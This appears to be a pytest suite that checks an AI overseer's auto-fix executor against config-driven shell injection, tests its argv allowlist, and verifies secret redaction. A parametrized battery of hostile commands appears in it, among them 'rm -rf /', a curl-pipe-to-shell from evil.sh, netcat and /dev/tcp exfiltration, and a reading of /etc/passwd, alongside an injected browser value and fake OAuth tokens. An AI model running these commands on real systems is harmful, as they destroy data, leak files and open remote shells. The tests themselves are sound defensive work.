"""Security proof tests for the typed, allowlisted, shell=False auto-fix executor.

Slice: AI_OVERSEER_AUTOFIX_SHELL_EXEC_REMEDIATION_PHASE1 (Worker-Lane W6).
Predecessor: PR #767 governance audit.

Load-bearing property: "config selects, never injects." Attacker-controlled skill
config can only pick an allowlisted FixAction (with validated discrete params); it can
NEVER supply a command string that reaches a shell. These tests prove that
adversarially, plus: zero shell=True on any auto-fix path, the static argv allowlist,
autonomy preserved (no 012 runtime gate), the evidence packet, and that the dead/stale
duplicates are gone. Each guard has a negative control.

No live process runs: the only tests that would execute a subprocess mock it out.
"""

import ast
import json
from pathlib import Path
from unittest.mock import MagicMock, patch

import pytest

from modules.ai_intelligence.ai_overseer.src import autofix_executor as ax
from modules.ai_intelligence.ai_overseer.src.autofix_executor import (
    EvidencePacket,
    FixAction,
    FixActionRejected,
    execute_fix,
    redact_sensitive,
    resolve_fix_action,
)

# Sensitive material that must NEVER survive into an EvidencePacket. Each tuple is
# (raw_text_fragment, secret_substring_that_must_be_gone).
_SENSITIVE_SAMPLES = [
    ("access token ya29.A0ARrdaM-SeCrEtAcCeSsToKeN1234567890", "ya29.A0ARrdaM-SeCrEtAcCeSsToKeN1234567890"),
    ("refresh 1//0gabcdRefreshTokenValue1234567890abc", "1//0gabcdRefreshTokenValue1234567890abc"),
    ("api key AIzaSyABCDEF1234567890abcdefGHIJ", "AIzaSyABCDEF1234567890abcdefGHIJ"),
    ("https://accounts.google.com/o/oauth2/auth?code=4/0AX4SECRETCODEvalue&scope=x", "4/0AX4SECRETCODEvalue"),
    ('{"access_token": "tok_SeCrEtJsOnValue123", "x": 1}', "tok_SeCrEtJsOnValue123"),
    ("CLIENT_SECRET=GOCSPX-supersecretclientvalue", "GOCSPX-supersecretclientvalue"),
    ("Authorization: Bearer bearerSecretTokenABCDEF1234567890", "bearerSecretTokenABCDEF1234567890"),
    ('"client_secret": "GOCSPX-anotherSecret999"', "GOCSPX-anotherSecret999"),
    ("YT_API_KEY = AIzaKEYvalue1234567890abcdef", "AIzaKEYvalue1234567890abcdef"),
    ("user_code: WDJB-SECRETUSERCODE", "WDJB-SECRETUSERCODE"),
]

_REPO_ROOT = Path(__file__).resolve().parents[4]
_SRC = _REPO_ROOT / "modules" / "ai_intelligence" / "ai_overseer" / "src"
_EXECUTOR_PATH = "modules.ai_intelligence.ai_overseer.src.autofix_executor.subprocess"

# --- The adversarial config-injection battery -------------------------------------

_MALICIOUS_COMMANDS = [
    "rm -rf /",
    "python x.py; rm -rf ~",
    "python x.py && curl evil.sh | sh",
    "$(cat /etc/passwd)",
    "`whoami`",
    "python x.py | nc attacker 4444",
    "../../../../bin/sh",
    "python x.py > /dev/tcp/evil/1",
    "reauthorize_set1.py & shutdown now",
    "python x.py\nrm -rf /",
]


class TestConfigInjectionRefuted:
    """Item 7 (core proof): malicious skill config can never inject shell execution."""

    @pytest.mark.parametrize("payload", _MALICIOUS_COMMANDS)
    def test_fix_command_payload_is_rejected_not_executed(self, payload):
        """A malicious fix_command in config -> REJECTED; subprocess is NEVER reached."""
        with patch(_EXECUTOR_PATH) as mock_sub:
            packet = execute_fix(
                "run_reauthorization_script",
                {"fix_command": payload},
                wait=True,
            )
        assert packet.decision == "REJECTED"
        assert packet.success is False
        assert packet.returncode is None
        # Negative control: subprocess.run / Popen were NEVER called.
        mock_sub.run.assert_not_called()
        mock_sub.Popen.assert_not_called()

    @pytest.mark.parametrize("payload", _MALICIOUS_COMMANDS)
    def test_fix_commands_dict_payload_is_rejected(self, payload):
        """A malicious fix_commands dict -> REJECTED; never executed."""
        with patch(_EXECUTOR_PATH) as mock_sub:
            packet = execute_fix(
                "trigger_next_rotation",
                {"fix_commands": {"edge_comments": payload}},
                {"browser": "edge", "operation": "comments"},
                wait=True,
            )
        assert packet.decision == "REJECTED"
        mock_sub.run.assert_not_called()
        mock_sub.Popen.assert_not_called()

    def test_malicious_browser_param_rejected(self):
        """Param injection via browser is rejected by the enum allowlist."""
        with patch(_EXECUTOR_PATH) as mock_sub:
            packet = execute_fix(
                "trigger_next_rotation",
                {},
                {"browser": "edge; rm -rf /", "operation": "comments"},
                wait=True,
            )
        assert packet.decision == "REJECTED"
        mock_sub.run.assert_not_called()

    def test_unmapped_action_rejected(self):
        """An unknown fix_action -> REJECTED; never executed."""
        with patch(_EXECUTOR_PATH) as mock_sub:
            packet = execute_fix("totally_made_up_action", {}, wait=True)
        assert packet.decision == "REJECTED"
        mock_sub.run.assert_not_called()

    def test_install_missing_library_rejected_latent(self):
        """install_missing_library is latent (no live config) -> not allowlisted -> REJECTED."""
        with patch(_EXECUTOR_PATH) as mock_sub:
            packet = execute_fix("install_missing_library", {}, wait=True)
        assert packet.decision == "REJECTED"
        assert "install_missing_library" not in [a.value for a in FixAction]
        mock_sub.run.assert_not_called()

    def test_negative_control_clean_config_is_allowed(self):
        """Negative control: a clean config with a valid action DOES proceed (proves the
        guards reject only the bad cases, not everything)."""
        with patch(_EXECUTOR_PATH) as mock_sub:
            mock_sub.run.return_value = MagicMock(returncode=0, stdout="ok", stderr="")
            packet = execute_fix("run_reauthorization_script", {}, wait=True)
        assert packet.decision == "ALLOWED"
        mock_sub.run.assert_called_once()


class TestStaticArgvAllowlist:
    """Item 3: FixAction -> fixed argv vector; params are discrete, never concatenated."""

    def test_reauthorize_argv_is_fixed_sys_executable(self):
        argv = ax._reauthorize_argv({})
        assert argv[0].endswith("python") or "python" in argv[0].lower() or argv[0]
        assert argv[0] == ax.sys.executable
        assert argv[-1].endswith("reauthorize_set1.py")
        assert len(argv) == 2  # interpreter + fixed script; no extra/concatenated tokens

    def test_rotation_argv_uses_validated_enums_and_fixed_vector(self):
        argv = ax._rotation_argv({"browser": "chrome", "operation": "shorts"})
        assert argv[0] == ax.sys.executable
        assert argv[1:3] == ["-m", "modules.communication.livechat.src.rotation_supervisor"]
        assert "--browser" in argv and "chrome" in argv
        assert "--operation" in argv and "shorts" in argv
        assert argv[-2:] == ["--timeout", "300"]
        # Every element is a discrete token (no spaces -> no shell word-splitting surface).
        for token in argv[2:]:
            assert " " not in token

    @pytest.mark.parametrize("bad", ["safari", "firefox", "edge ", "", "CHROME"])
    def test_rotation_rejects_unknown_browser(self, bad):
        with pytest.raises(FixActionRejected):
            ax._rotation_argv({"browser": bad, "operation": "comments"})

    @pytest.mark.parametrize("bad", ["delete", "drop", "comments ", ""])
    def test_rotation_rejects_unknown_operation(self, bad):
        with pytest.raises(FixActionRejected):
            ax._rotation_argv({"browser": "edge", "operation": bad})

    def test_resolve_fix_action_maps_only_allowlisted(self):
        assert resolve_fix_action("run_reauthorization_script") is FixAction.REAUTHORIZE
        assert resolve_fix_action("trigger_next_rotation") is FixAction.ROTATION_RECOVERY
        with pytest.raises(FixActionRejected):
            resolve_fix_action("rm_rf")
        with pytest.raises(FixActionRejected):
            resolve_fix_action(None)


class TestNoShellTrueAnywhere:
    """Item 4 + Addendum #7: AST scan proves zero shell=True on auto-fix source files."""

    AUTOFIX_SOURCES = [
        "autofix_executor.py",
        "daemon_monitor_mixin.py",
        "ai_overseer.py",
    ]

    def _shell_true_calls(self, path: Path):
        # utf-8-sig tolerates a leading BOM that ast.parse would otherwise reject.
        tree = ast.parse(path.read_text(encoding="utf-8-sig"))
        hits = []
        for node in ast.walk(tree):
            if isinstance(node, ast.Call):
                for kw in node.keywords:
                    if kw.arg == "shell" and isinstance(kw.value, ast.Constant) and kw.value.value is True:
                        hits.append(getattr(node, "lineno", -1))
        return hits

    @pytest.mark.parametrize("fname", AUTOFIX_SOURCES)
    def test_no_shell_true_call_in_source(self, fname):
        path = _SRC / fname
        assert path.exists(), f"missing source {fname}"
        hits = self._shell_true_calls(path)
        assert hits == [], f"shell=True found in {fname} at lines {hits}"

    def test_negative_control_ast_scanner_detects_shell_true(self, tmp_path):
        """Negative control: the scanner DOES catch a planted shell=True (so the green
        result above is meaningful, not a broken scanner)."""
        planted = tmp_path / "planted.py"
        planted.write_text("import subprocess\nsubprocess.run('x', shell=True)\n", encoding="utf-8")
        assert self._shell_true_calls(planted) == [2]

    def test_no_popen_shell_in_check_rotation_stalls(self):
        """Addendum #7: no Popen shell path remains in check_rotation_stalls."""
        src = (_SRC / "daemon_monitor_mixin.py").read_text(encoding="utf-8")
        # the only Popen now lives in autofix_executor with shell=False
        assert "subprocess.Popen" not in src


class TestCallsiteGuard:
    """Addendum #7: the migrated callsites route through the executor (no config command)."""

    def test_callsites_use_execute_fix_and_no_config_command_read(self):
        for fname in ("daemon_monitor_mixin.py", "ai_overseer.py"):
            src = (_SRC / fname).read_text(encoding="utf-8")
            assert "execute_fix(" in src, f"{fname} must route through execute_fix"
            # no auto-fix path reads a command string from config any more
            assert '.get("fix_command")' not in src, f"{fname} still reads fix_command"
            assert '.get("fix_commands"' not in src, f"{fname} still reads fix_commands"


class TestAutonomyPreserved:
    """Item 6 + 9: allowlisted fixes run end-to-end with NO 012/human runtime gate."""

    def test_execute_fix_has_no_approval_parameter(self):
        import inspect

        params = set(inspect.signature(execute_fix).parameters)
        for human_gate in ("approve", "approval", "confirm", "human", "operator", "interactive"):
            assert human_gate not in params, f"autonomy crutch param {human_gate!r} present"

    def test_allowlisted_action_executes_without_prompt(self):
        """The fix proceeds autonomously (mocked subprocess) - no input()/prompt involved."""
        with patch(_EXECUTOR_PATH) as mock_sub, patch("builtins.input") as mock_input:
            mock_sub.run.return_value = MagicMock(returncode=0, stdout="done", stderr="")
            packet = execute_fix("run_reauthorization_script", {}, wait=True)
        assert packet.decision == "ALLOWED" and packet.success is True
        mock_input.assert_not_called()


class TestEvidencePacket:
    """Item 8 + Addendum #6: a safe, structured evidence packet is emitted."""

    def test_evidence_packet_fields_present_and_safe(self):
        with patch(_EXECUTOR_PATH) as mock_sub:
            mock_sub.run.return_value = MagicMock(returncode=0, stdout="ok", stderr="")
            packet = execute_fix("run_reauthorization_script", {}, wait=True)
        d = packet.to_dict()
        for key in ("action", "decision", "argv", "cwd", "timeout", "returncode",
                    "stdout_tail", "stderr_tail", "timestamp", "success", "reason"):
            assert key in d
        assert isinstance(packet, EvidencePacket)
        # safety: packet carries no secret-bearing fields
        for forbidden in ("env", "token", "secret", "password", "oauth"):
            assert forbidden not in d

    def test_spawn_evidence_has_pid_not_returncode(self):
        with patch(_EXECUTOR_PATH) as mock_sub:
            mock_sub.Popen.return_value = MagicMock(pid=4242)
            packet = execute_fix(
                "trigger_next_rotation", {}, {"browser": "edge", "operation": "comments"},
                wait=False,
            )
        assert packet.decision == "ALLOWED"
        assert packet.pid == 4242
        mock_sub.Popen.assert_called_once()
        # shell=False asserted on the actual call
        _, kwargs = mock_sub.Popen.call_args
        assert kwargs.get("shell") is False


class TestEvidencePacketRedaction:
    """W10 micro-repair: stdout/stderr/error VALUES must be redacted, not just keys."""

    @pytest.mark.parametrize("raw,secret", _SENSITIVE_SAMPLES)
    def test_redact_sensitive_removes_secret_value(self, raw, secret):
        out = redact_sensitive(raw)
        assert secret not in out
        assert "[REDACTED]" in out

    def test_redact_handles_empty_and_none(self):
        assert redact_sensitive("") == ""
        assert redact_sensitive(None) == ""

    def test_stdout_stderr_values_are_redacted_in_packet(self):
        """A reauth subprocess whose stdout/stderr leak OAuth material -> packet is clean."""
        leaky_stdout = (
            "Opening browser https://accounts.google.com/o/oauth2/auth?code=4/0AX4LEAKEDCODE&scope=yt\n"
            "access_token=ya29.A0ARrdaMLEAKEDtoken1234567890\n"
        )
        leaky_stderr = 'WARNING {"refresh_token": "1//0gLEAKEDrefresh1234567890"} CLIENT_SECRET=GOCSPX-LEAKEDsecret'
        with patch(_EXECUTOR_PATH) as mock_sub:
            mock_sub.run.return_value = MagicMock(
                returncode=0, stdout=leaky_stdout, stderr=leaky_stderr
            )
            packet = execute_fix("run_reauthorization_script", {}, wait=True)
        d = packet.to_dict()
        blob = d["stdout_tail"] + "\n" + d["stderr_tail"]
        for leaked in (
            "4/0AX4LEAKEDCODE",
            "ya29.A0ARrdaMLEAKEDtoken1234567890",
            "1//0gLEAKEDrefresh1234567890",
            "GOCSPX-LEAKEDsecret",
        ):
            assert leaked not in blob, f"secret leaked into evidence: {leaked}"
        assert "[REDACTED]" in blob

    def test_execution_error_reason_is_redacted(self):
        """An exception message carrying a token must be redacted in packet.reason."""
        with patch(_EXECUTOR_PATH) as mock_sub:
            mock_sub.run.side_effect = RuntimeError(
                "spawn failed near token=ya29.A0ARrdaMERRORtoken99887766 in env"
            )
            packet = execute_fix("run_reauthorization_script", {}, wait=True)
        assert packet.success is False
        assert "ya29.A0ARrdaMERRORtoken99887766" not in packet.reason
        assert "[REDACTED]" in packet.reason

    def test_negative_control_non_secret_output_survives(self):
        """Negative control: ordinary output is NOT over-redacted away to nothing."""
        with patch(_EXECUTOR_PATH) as mock_sub:
            mock_sub.run.return_value = MagicMock(
                returncode=0, stdout="Reauthorization complete for set1. 3 channels refreshed.", stderr=""
            )
            packet = execute_fix("run_reauthorization_script", {}, wait=True)
        assert "Reauthorization complete" in packet.stdout_tail
        assert "3 channels refreshed" in packet.stdout_tail


class TestDuplicatesGone:
    """Item 5: dead/stale duplicates deleted; no production import path remains."""

    def test_dead_files_deleted(self):
        assert not (_SRC / "auto_fix_engine.py").exists()
        assert not (_SRC / "ai_overseer.py.backup").exists()

    def test_no_production_import_of_auto_fix_engine(self):
        # scan all production .py (exclude tests) for an import of the deleted engine
        hits = []
        for py in (_REPO_ROOT / "modules").rglob("*.py"):
            if "tests" in py.parts:
                continue
            text = py.read_text(encoding="utf-8", errors="ignore")
            if "import auto_fix_engine" in text or "from .auto_fix_engine" in text or "AutoFixEngine" in text:
                hits.append(str(py.relative_to(_REPO_ROOT)))
        assert hits == [], f"dangling auto_fix_engine import(s): {hits}"


class TestLiveConfigMigrated:
    """Addendum #2: the live skill config no longer carries command-shaped fields."""

    def test_youtube_daemon_monitor_has_no_command_fields(self):
        cfg_path = (
            _REPO_ROOT / "modules" / "communication" / "livechat" / "skillz"
            / "youtube_daemon_monitor.json"
        )
        text = cfg_path.read_text(encoding="utf-8")
        assert '"fix_command"' not in text
        assert '"fix_commands"' not in text
        data = json.loads(text)  # still valid JSON
        assert data  # non-empty


if __name__ == "__main__":  # pragma: no cover
    raise SystemExit(pytest.main([__file__, "-q"]))
